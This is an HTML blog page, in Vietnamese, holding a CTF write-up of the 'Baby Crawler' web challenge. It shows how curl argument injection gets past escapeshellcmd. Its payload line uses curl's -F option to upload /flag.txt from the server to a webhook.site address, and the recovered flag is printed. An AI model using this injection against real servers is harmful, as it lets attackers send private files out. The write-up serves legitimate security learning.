@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>CookieCTF - Baby Crawler - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:title" content="CookieCTF - Baby Crawler" />
+<meta property="og:description" content="Link challenge tại đâyĐây là giao diện chính của challenge:
+Ở challenge này, khi ấn vào nút CRAWL trang web sẽ hiển thị một đường link Cached File
+Khi click vào đường link ta sẽ thấy html của trang web
+Quay trở lại giao diện chính, kiểm tra source code thì phát hiện 1 endpoint ?debug
+Kiểm tra thì thấy được đoạn code chạy ở server-side. Chú ý vào đoạn code này:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://g03m0n.github.io/cookiectf-baby-crawler/cookiectf-baby-crawl/" /><meta property="og:image" content="https://g03m0n.github.io/logo.png"/><meta property="article:section" content="CookieCTF - Baby Crawler" />
+<meta property="article:published_time" content="2024-01-19T21:29:01+08:00" />
+<meta property="article:modified_time" content="2024-01-19T21:29:01+08:00" /><meta property="og:site_name" content="g03m0n" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://g03m0n.github.io/logo.png"/>
+
+<meta name="twitter:title" content="CookieCTF - Baby Crawler"/>
+<meta name="twitter:description" content="Link challenge tại đâyĐây là giao diện chính của challenge:
+Ở challenge này, khi ấn vào nút CRAWL trang web sẽ hiển thị một đường link Cached File
+Khi click vào đường link ta sẽ thấy html của trang web
+Quay trở lại giao diện chính, kiểm tra source code thì phát hiện 1 endpoint ?debug
+Kiểm tra thì thấy được đoạn code chạy ở server-side. Chú ý vào đoạn code này:"/>
+<meta name="application-name" content="g03m0n">
+<meta name="apple-mobile-web-app-title" content="g03m0n"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/cookiectf-baby-crawler/cookiectf-baby-crawl/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CookieCTF - Baby Crawler",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/g03m0n.github.io\/cookiectf-baby-crawler\/cookiectf-baby-crawl\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "CookieCTF - Baby Crawler","keywords": "ctf, easy_ctf","wordcount":  243 ,
+        "url": "https:\/\/g03m0n.github.io\/cookiectf-baby-crawler\/cookiectf-baby-crawl\/","datePublished": "2024-01-19T21:29:01+08:00","dateModified": "2024-01-19T21:29:01+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "g03m0n"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">CookieCTF - Baby Crawler</h1><div class="content" id="content"><p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-crawler" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Đây là giao diện chính của challenge:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://user-images.githubusercontent.com/130943529/297949082-8cf0f0b1-d4e0-430f-b4c7-732ac0e7c898.png"
+        data-srcset="https://user-images.githubusercontent.com/130943529/297949082-8cf0f0b1-d4e0-430f-b4c7-732ac0e7c898.png, https://user-images.githubusercontent.com/130943529/297949082-8cf0f0b1-d4e0-430f-b4c7-732ac0e7c898.png 1.5x, https://user-images.githubusercontent.com/130943529/297949082-8cf0f0b1-d4e0-430f-b4c7-732ac0e7c898.png 2x"
+        data-sizes="auto"
+        alt="https://user-images.githubusercontent.com/130943529/297949082-8cf0f0b1-d4e0-430f-b4c7-732ac0e7c898.png"
+        title="image" /></p>
+<p>Ở challenge này, khi ấn vào nút <code>CRAWL</code> trang web sẽ hiển thị một đường link <code>Cached File</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/19abf4a6-ddc3-451a-811c-ee81b0a628c1"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/19abf4a6-ddc3-451a-811c-ee81b0a628c1, https://github.com/g03m0n/pics/assets/130943529/19abf4a6-ddc3-451a-811c-ee81b0a628c1 1.5x, https://github.com/g03m0n/pics/assets/130943529/19abf4a6-ddc3-451a-811c-ee81b0a628c1 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/19abf4a6-ddc3-451a-811c-ee81b0a628c1"
+        title="image" /></p>
+<p>Khi click vào đường link ta sẽ thấy <code>html</code> của trang web</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/115ff4bf-c5c8-4556-afba-cf3b00230f0a"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/115ff4bf-c5c8-4556-afba-cf3b00230f0a, https://github.com/g03m0n/pics/assets/130943529/115ff4bf-c5c8-4556-afba-cf3b00230f0a 1.5x, https://github.com/g03m0n/pics/assets/130943529/115ff4bf-c5c8-4556-afba-cf3b00230f0a 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/115ff4bf-c5c8-4556-afba-cf3b00230f0a"
+        title="image" /></p>
+<p>Quay trở lại giao diện chính, kiểm tra source code thì phát hiện 1 endpoint <code>?debug</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/c6407f27-c547-4d19-8a33-1aa977231233"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/c6407f27-c547-4d19-8a33-1aa977231233, https://github.com/g03m0n/pics/assets/130943529/c6407f27-c547-4d19-8a33-1aa977231233 1.5x, https://github.com/g03m0n/pics/assets/130943529/c6407f27-c547-4d19-8a33-1aa977231233 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/c6407f27-c547-4d19-8a33-1aa977231233"
+        title="image" /></p>
+<p>Kiểm tra thì thấy được đoạn code chạy ở server-side. Chú ý vào đoạn code này:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/383ac1d0-5495-4b91-991c-36d7693ea416"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/383ac1d0-5495-4b91-991c-36d7693ea416, https://github.com/g03m0n/pics/assets/130943529/383ac1d0-5495-4b91-991c-36d7693ea416 1.5x, https://github.com/g03m0n/pics/assets/130943529/383ac1d0-5495-4b91-991c-36d7693ea416 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/383ac1d0-5495-4b91-991c-36d7693ea416"
+        title="image" /></p>
+<p>Đoạn code sẽ kiểm tra url người dung nhập vào có sử dụng HTTP/HTTPS hay không, nếu có website sẽ <code>crawl</code> web bằng lệnh <code>curl</code>, sau đó lưu nội dung <code>crawl</code> được vào một file nằm trong thư mục <code>./cache</code>.
+Vì có hàm <code>shell_exec</code> nên đây có thể là một lỗi Command Injection. Ở đây hàm <code>escapeshellcmd</code> được dùng để chặn các ký tự  <code>&amp;#;``|*?~&lt;&gt;^()[]{}$\</code>, <code>\x0A</code> và <code>\xFF</code> từ <code>url</code> người dùng nhập vào.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/7f9fa208-0120-468a-a3a6-e5a7640db9db"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/7f9fa208-0120-468a-a3a6-e5a7640db9db, https://github.com/g03m0n/pics/assets/130943529/7f9fa208-0120-468a-a3a6-e5a7640db9db 1.5x, https://github.com/g03m0n/pics/assets/130943529/7f9fa208-0120-468a-a3a6-e5a7640db9db 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/7f9fa208-0120-468a-a3a6-e5a7640db9db"
+        title="image" /></p>
+<p>Vì vậy ta không thể bypass được challenge này theo hướng sử dụng các ký tự <code>;</code> hay <code>&amp;</code>, bắt buộc phải đi theo một hướng khác.
+Thay vì <code>inject</code> một câu lệnh để server thực hiện sau khi đã thực hiện lệnh <code>curl</code>, ta có thể tận dụng trực tiếp câu lệnh <code>curl</code> để gửi nội dung của file tới một server do ta tự dựng lên với option <code>-F</code>.</p>
+<p>Mình sẽ sử dụng <a href="https://webhook.site" target="_blank" rel="noopener noreffer">webhook.site</a>
+ để làm server nhận file gửi đến.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/35e00b65-6578-4705-8fa3-e80f02008521"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/35e00b65-6578-4705-8fa3-e80f02008521, https://github.com/g03m0n/pics/assets/130943529/35e00b65-6578-4705-8fa3-e80f02008521 1.5x, https://github.com/g03m0n/pics/assets/130943529/35e00b65-6578-4705-8fa3-e80f02008521 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/35e00b65-6578-4705-8fa3-e80f02008521"
+        title="image" /></p>
+<p>Payload:
+<code>http://18.142.90.137:31315/ -F file=@/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/05a9a249-1dc4-437b-a27f-98b55ca16816"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/05a9a249-1dc4-437b-a27f-98b55ca16816, https://github.com/g03m0n/pics/assets/130943529/05a9a249-1dc4-437b-a27f-98b55ca16816 1.5x, https://github.com/g03m0n/pics/assets/130943529/05a9a249-1dc4-437b-a27f-98b55ca16816 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/05a9a249-1dc4-437b-a27f-98b55ca16816"
+        title="image" /></p>
+<p>Tải file <code>flag.txt</code> về ta được flag: <code>CHH{b48Y_CUrl_CrAwl3r_1c7ddee4c53dfc5fc952c63ca0aebb9a}</code></p>
+</div><div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></div></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.120.4">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"g03m0n/comments"}},"lightgallery":true,"search":{"highlightTag":"em","maxResultLength":20,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
